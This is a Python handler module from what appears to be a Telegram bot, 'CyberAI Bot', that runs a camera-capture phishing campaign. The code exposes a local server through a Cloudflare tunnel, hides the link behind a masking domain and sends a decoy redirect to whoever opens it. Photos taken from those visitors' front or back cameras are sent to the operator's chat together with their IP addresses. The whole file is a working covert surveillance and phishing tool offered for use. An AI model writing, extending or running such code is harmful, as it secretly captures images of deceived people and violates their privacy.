"""
CyberAI Bot — Camera Capture Handler
Multi-step conversational flow for configuring and running the camera server.
Also handles the combined Camera + URL Masker flow.
"""

import logging
import asyncio
from pathlib import Path
from telegram import Update
from telegram.error import BadRequest
from telegram.ext import (
    ContextTypes, CallbackQueryHandler, MessageHandler,
    filters, CommandHandler
)

from bot.middleware.auth import authorized_only
from bot.utils.keyboards import (
    camera_mode_keyboard, confirmation_keyboard, server_control_keyboard,
    main_menu_keyboard, home_only_keyboard, back_home_keyboard
)
from bot.utils.messages import (
    cam_setup_mode_prompt, cam_setup_redirect_url, cam_setup_redirect_time,
    cam_setup_server_url, cam_confirm, cam_started, cam_stopped, cam_status,
    cam_new_capture, error_message, server_already_running,
    masker_prompt_domain, masker_prompt_keywords
)
from bot.services.cam_service import cam_service
from bot.database.session import (
    set_conversation_state, get_conversation_state,
    clear_conversation_state, log_activity, get_session, save_session
)
from bot.services.tunnel_service import CloudflareTunnelService
from bot.config import CAM_SERVER_PORT

logger = logging.getLogger(__name__)


async def _safe_edit(query, text, parse_mode="HTML", reply_markup=None):
    """Edit message text, silently ignoring 'message is not modified' errors."""
    try:
        await query.edit_message_text(
            text=text,
            parse_mode=parse_mode,
            reply_markup=reply_markup,
        )
    except BadRequest as e:
        if "message is not modified" not in str(e).lower():
            raise


# ── Menu Entry ────────────────────────────────────────────────

@authorized_only
async def cam_menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Entry point: user taps '📷 Camera Capture' or '📷+🔗 Cam + Masker'."""
    query = update.callback_query
    await query.answer()

    user = update.effective_user

    # Check if server is already running
    if cam_service.is_running:
        await _safe_edit(
            query,
            server_already_running(cam_service.server_url),
            reply_markup=server_control_keyboard(),
        )
        return

    # Determine if this is combined mode
    combined = query.data == "menu_cam_masker"
    context.user_data["cam_combined"] = combined

    # Set conversation state
    set_conversation_state(user.id, {"flow": "cam_setup", "step": "mode"})

    await _safe_edit(
        query,
        cam_setup_mode_prompt(),
        reply_markup=camera_mode_keyboard(),
    )


# ── Camera Mode Selection ────────────────────────────────────

@authorized_only
async def cam_mode_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle camera mode selection (front/back/both)."""
    query = update.callback_query
    await query.answer()

    # If the user is in settings flow, delegate to settings handler
    if context.user_data.get("settings_changing") == "cam_mode":
        from bot.handlers.settings_handler import settings_cam_mode_set
        await settings_cam_mode_set(update, context)
        return

    user = update.effective_user
    mode = query.data.replace("cam_mode_", "")  # front, back, both

    context.user_data["cam_mode"] = mode
    set_conversation_state(user.id, {"flow": "cam_setup", "step": "redirect_url"})

    await _safe_edit(
        query,
        cam_setup_redirect_url(),
        reply_markup=back_home_keyboard(),
    )


# ── Text Input Handler ───────────────────────────────────────

@authorized_only
async def cam_text_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle text inputs during camera setup flow."""
    user = update.effective_user
    state = get_conversation_state(user.id)

    if state.get("flow") != "cam_setup":
        return  # Not in camera setup flow

    step = state.get("step")
    text = update.message.text.strip()

    if step == "redirect_url":
        # Validate URL
        if not text.startswith(("http://", "https://")):
            text = "https://" + text

        context.user_data["cam_redirect_url"] = text
        set_conversation_state(user.id, {"flow": "cam_setup", "step": "redirect_time"})

        await update.message.reply_text(
            cam_setup_redirect_time(),
            parse_mode="HTML",
            reply_markup=back_home_keyboard(),
        )
    elif step == "redirect_time":
        try:
            redirect_time = int(text)
            if redirect_time < 1 or redirect_time > 300:
                raise ValueError("Out of range")
        except (ValueError, TypeError):
            await update.message.reply_text(
                "Please enter a valid number between 1 and 300.",
            )
            return

        context.user_data["cam_redirect_time"] = redirect_time
        set_conversation_state(user.id, {"flow": "cam_setup", "step": "starting_tunnel"})

        await _start_cloudflare_tunnel(update, context, user.id)

    elif step == "server_url":
        if not text.startswith(("http://", "https://")):
            text = "https://" + text

        context.user_data["cam_server_url"] = text
        set_conversation_state(user.id, {"flow": "cam_setup", "step": "confirm"})

        # Show confirmation
        await update.message.reply_text(
            cam_confirm(
                context.user_data.get("cam_mode", "front"),
                context.user_data.get("cam_redirect_url", ""),
                context.user_data.get("cam_redirect_time", 5),
                text,
            ),
            parse_mode="HTML",
            reply_markup=confirmation_keyboard("cam_confirm"),
        )

    elif step == "mask_domain":
        # Combined flow: mask domain input
        context.user_data["mask_domain"] = text
        set_conversation_state(user.id, {"flow": "cam_setup", "step": "mask_keywords"})

        await update.message.reply_text(
            masker_prompt_keywords(),
            parse_mode="HTML",
        )

    elif step == "mask_keywords":
        # Combined flow: keywords input
        keywords = "" if text == "/skip" else text
        context.user_data["mask_keywords"] = keywords

        # Perform masking
        await _do_mask_server_url(update, context)

async def _start_cloudflare_tunnel(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int):
    """Automatically start Cloudflare Quick Tunnel to expose Flask app."""
    # Send loading message
    status_msg = await update.message.reply_text(
        "⏳ <b>Launching Cloudflare Quick Tunnel...</b>\n\n"
        "Exposing local server on port 5000.\n"
        "If <code>cloudflared</code> is not installed, it will be downloaded automatically.\n"
        "This may take a moment. Please wait...",
        parse_mode="HTML"
    )

    session = get_session(user_id)
    if 'tunnel_service' not in session or session['tunnel_service'] is None:
        session['tunnel_service'] = CloudflareTunnelService()
        save_session(user_id, session)

    tunnel_service = session['tunnel_service']
    
    # Stop tunnel if already running to prevent address-in-use or multiple tunnels
    if tunnel_service.is_running():
        try:
            tunnel_service.stop_tunnel()
        except Exception:
            pass

    try:
        tunnel_service.start_tunnel(local_port=CAM_SERVER_PORT)
    except Exception as e:
        logger.error(f"Error launching Cloudflare Tunnel: {e}")
        await status_msg.edit_text(
            f"❌ <b>Cloudflare Tunnel Error</b>\n\n"
            f"Could not start tunnel: <code>{e}</code>\n\n"
            "Please check system connectivity and logs.",
            parse_mode="HTML"
        )
        clear_conversation_state(user_id)
        return

    # Poll status for the URL
    tunnel_url = None
    # We poll for up to 30 seconds since automatic download might take a few seconds
    for _ in range(30):
        await asyncio.sleep(1)
        status = tunnel_service.get_status()
        if status.get("running") and status.get("url"):
            tunnel_url = status.get("url")
            break

    if tunnel_url:
        context.user_data["cam_server_url"] = tunnel_url
        set_conversation_state(user_id, {"flow": "cam_setup", "step": "confirm"})
        
        await status_msg.edit_text(
            cam_confirm(
                context.user_data.get("cam_mode", "front"),
                context.user_data.get("cam_redirect_url", ""),
                context.user_data.get("cam_redirect_time", 5),
                tunnel_url
            ),
            parse_mode="HTML",
            reply_markup=confirmation_keyboard("cam_confirm")
        )
    else:
        # Timeout or error retrieving URL
        logger.error("Timeout waiting for Cloudflare Tunnel URL")
        # Ensure we clean up the process if it's running without URL
        tunnel_service.stop_tunnel()
        
        await status_msg.edit_text(
            "❌ <b>Cloudflare Tunnel Timeout</b>\n\n"
            "Could not retrieve the public tunnel URL. Please check internet connection.",
            parse_mode="HTML"
        )
        clear_conversation_state(user_id)


# ── Confirmation ──────────────────────────────────────────────

@authorized_only
async def cam_confirm_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle start/cancel confirmation."""
    query = update.callback_query
    await query.answer()

    user = update.effective_user

    if query.data == "cam_confirm_no":
        session = get_session(user.id)
        tunnel_service = session.get('tunnel_service')
        if tunnel_service and tunnel_service.is_running():
            try:
                tunnel_service.stop_tunnel()
            except Exception as e:
                logger.error(f"Error stopping tunnel: {e}")

        clear_conversation_state(user.id)
        context.user_data.clear()
        await _safe_edit(
            query,
            "Camera setup cancelled.",
            reply_markup=main_menu_keyboard(),
        )
        return

    # Start the server
    cam_mode = context.user_data.get("cam_mode", "front")
    redirect_url = context.user_data.get("cam_redirect_url", "https://google.com")
    redirect_time = context.user_data.get("cam_redirect_time", 5)
    server_url = context.user_data.get("cam_server_url", "")

    # Configure the service
    cam_service.configure(
        redirect_url=redirect_url,
        redirect_time=redirect_time,
        camera_mode=cam_mode,
        server_url=server_url,
    )

    # Set up capture callback to send images to this chat
    chat_id = update.effective_chat.id
    bot = context.bot

    async def send_capture_async(filepath, ip, camera):
        """Send a captured image to the Telegram chat."""
        try:
            if filepath.exists() and filepath.stat().st_size > 0:
                with open(filepath, 'rb') as photo:
                    caption = cam_new_capture(filepath.name, ip, camera)
                    await bot.send_photo(
                        chat_id=chat_id,
                        photo=photo,
                        caption=caption,
                        parse_mode="HTML",
                    )
        except Exception as e:
            logger.error(f"Failed to send capture to Telegram: {e}")

    # Capture the running event loop NOW (we are in an async context here)
    # so the monitor thread can safely schedule coroutines later.
    loop = asyncio.get_running_loop()

    def on_capture(filepath, ip, camera):
        """Callback from monitor thread — bridges to async via run_coroutine_threadsafe."""
        try:
            asyncio.run_coroutine_threadsafe(
                send_capture_async(Path(filepath), ip, camera),
                loop
            )
        except Exception as e:
            logger.error(f"Capture callback error: {e}")

    cam_service.set_capture_callback(on_capture)

    # Start the server
    started = cam_service.start()

    if started:
        log_activity(user.id, "cam_start", f"mode={cam_mode}, url={server_url}")
        clear_conversation_state(user.id)

        reply_markup = server_control_keyboard()

        # If combined mode, offer URL masking
        if context.user_data.get("cam_combined"):
            set_conversation_state(user.id, {"flow": "cam_setup", "step": "mask_domain"})

            await _safe_edit(
                query,
                cam_started(server_url) + "\n\nNow let's mask this URL!\n\nEnter the masking domain (e.g., google.com):",
            )
        else:
            await _safe_edit(
                query,
                cam_started(server_url),
                reply_markup=reply_markup,
            )
    else:
        await _safe_edit(
            query,
            error_message("Failed to start camera server. Port may be in use."),
            reply_markup=main_menu_keyboard(),
        )


# ── Server Controls ──────────────────────────────────────────

@authorized_only
async def cam_stop_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Stop the camera server."""
    query = update.callback_query
    await query.answer("Stopping server...")

    user = update.effective_user

    # Stop the tunnel if active
    session = get_session(user.id)
    tunnel_service = session.get('tunnel_service')
    if tunnel_service and tunnel_service.is_running():
        try:
            tunnel_service.stop_tunnel()
        except Exception as e:
            logger.error(f"Error stopping tunnel: {e}")

    if cam_service.is_running:
        stats = cam_service.stop()
        log_activity(user.id, "cam_stop", f"captures={stats['total_captures']}")

        await _safe_edit(
            query,
            cam_stopped(stats["total_captures"], stats["uptime"]),
            reply_markup=main_menu_keyboard(),
        )
    else:
        await _safe_edit(
            query,
            "No server is currently running.",
            reply_markup=main_menu_keyboard(),
        )


@authorized_only
async def cam_status_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show server status."""
    query = update.callback_query
    await query.answer()

    status = cam_service.get_status()
    reply_markup = server_control_keyboard() if status["is_running"] else main_menu_keyboard()

    await _safe_edit(
        query,
        cam_status(status["is_running"], status["capture_count"], status["uptime"]),
        reply_markup=reply_markup,
    )


@authorized_only
async def cam_view_captures_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Send latest captures as photos."""
    query = update.callback_query
    await query.answer("Fetching captures...")

    captures = cam_service.get_captures(limit=5)
    chat_id = update.effective_chat.id

    if not captures:
        await _safe_edit(
            query,
            "No captures yet.\n\nWaiting for targets to visit the link...",
            reply_markup=server_control_keyboard() if cam_service.is_running else main_menu_keyboard(),
        )
        return

    # Send each capture as a photo
    for filepath in captures:
        try:
            with open(filepath, 'rb') as photo:
                await context.bot.send_photo(
                    chat_id=chat_id,
                    photo=photo,
                    caption=f"Capture: {filepath.name}",
                )
        except Exception as e:
            logger.error(f"Failed to send photo {filepath}: {e}")

    await context.bot.send_message(
        chat_id=chat_id,
        text=f"Sent {len(captures)} latest capture(s)",
        reply_markup=server_control_keyboard() if cam_service.is_running else main_menu_keyboard(),
    )


@authorized_only
async def cam_mask_url_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Mask the server URL (from server control)."""
    query = update.callback_query
    await query.answer()

    if not cam_service.server_url:
        await _safe_edit(
            query,
            "No server URL to mask.",
            reply_markup=server_control_keyboard(),
        )
        return

    user = update.effective_user
    context.user_data["mask_original_url"] = cam_service.server_url
    set_conversation_state(user.id, {"flow": "cam_setup", "step": "mask_domain"})

    await _safe_edit(
        query,
        f"Mask Server URL\n\nURL: {cam_service.server_url}\n\nEnter the masking domain (e.g., google.com):",
    )


async def _do_mask_server_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Perform URL masking for the server URL."""
    from bot.services.masker_service import masker_service

    original_url = context.user_data.get("mask_original_url", cam_service.server_url)
    mask_domain = context.user_data.get("mask_domain", "google.com")
    keywords = context.user_data.get("mask_keywords", "")

    processing_msg = await update.message.reply_text(
        "Masking URL...",
    )

    result = await masker_service.mask_url(original_url, mask_domain, keywords)

    if result["success"]:
        from bot.utils.messages import masker_result
        text = masker_result(
            result["original_url"],
            result["shortened_url"],
            result["masked_urls"],
        )
        reply_markup = server_control_keyboard() if cam_service.is_running else main_menu_keyboard()

        try:
            await processing_msg.edit_text(
                text,
                parse_mode="HTML",
                reply_markup=reply_markup,
            )
        except BadRequest:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=text,
                parse_mode="HTML",
                reply_markup=reply_markup,
            )
    else:
        from bot.utils.messages import masker_failed
        try:
            await processing_msg.edit_text(
                masker_failed(result.get("error", "Unknown error")),
                parse_mode="HTML",
                reply_markup=server_control_keyboard() if cam_service.is_running else main_menu_keyboard(),
            )
        except BadRequest:
            pass

    user = update.effective_user
    clear_conversation_state(user.id)


@authorized_only
async def stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /stop command."""
    user = update.effective_user

    # Stop the tunnel if active
    session = get_session(user.id)
    tunnel_service = session.get('tunnel_service')
    if tunnel_service and tunnel_service.is_running():
        try:
            tunnel_service.stop_tunnel()
        except Exception as e:
            logger.error(f"Error stopping tunnel: {e}")

    if cam_service.is_running:
        stats = cam_service.stop()
        log_activity(user.id, "cam_stop", f"captures={stats['total_captures']}")

        await update.message.reply_text(
            cam_stopped(stats["total_captures"], stats["uptime"]),
            parse_mode="HTML",
            reply_markup=main_menu_keyboard(),
        )
    else:
        await update.message.reply_text(
            "No server is currently running.",
            reply_markup=main_menu_keyboard(),
        )


@authorized_only
async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle /status command."""
    status = cam_service.get_status()
    reply_markup = server_control_keyboard() if status["is_running"] else main_menu_keyboard()

    await update.message.reply_text(
        cam_status(status["is_running"], status["capture_count"], status["uptime"]),
        parse_mode="HTML",
        reply_markup=reply_markup,
    )


def get_handlers():
    """Return all handlers for this module."""
    return [
        # Menu entry callbacks
        CallbackQueryHandler(cam_menu_callback, pattern="^menu_cam$"),
        CallbackQueryHandler(cam_menu_callback, pattern="^menu_cam_masker$"),

        # Camera mode selection
        CallbackQueryHandler(cam_mode_callback, pattern="^cam_mode_"),

        # Confirmation
        CallbackQueryHandler(cam_confirm_callback, pattern="^cam_confirm_"),

        # Server controls
        CallbackQueryHandler(cam_stop_callback, pattern="^cam_stop$"),
        CallbackQueryHandler(cam_status_callback, pattern="^cam_status$"),
        CallbackQueryHandler(cam_view_captures_callback, pattern="^cam_view_captures$"),
        CallbackQueryHandler(cam_mask_url_callback, pattern="^cam_mask_url$"),

        # Commands
        CommandHandler("stop", stop_command),
        CommandHandler("status", status_command),
    ]
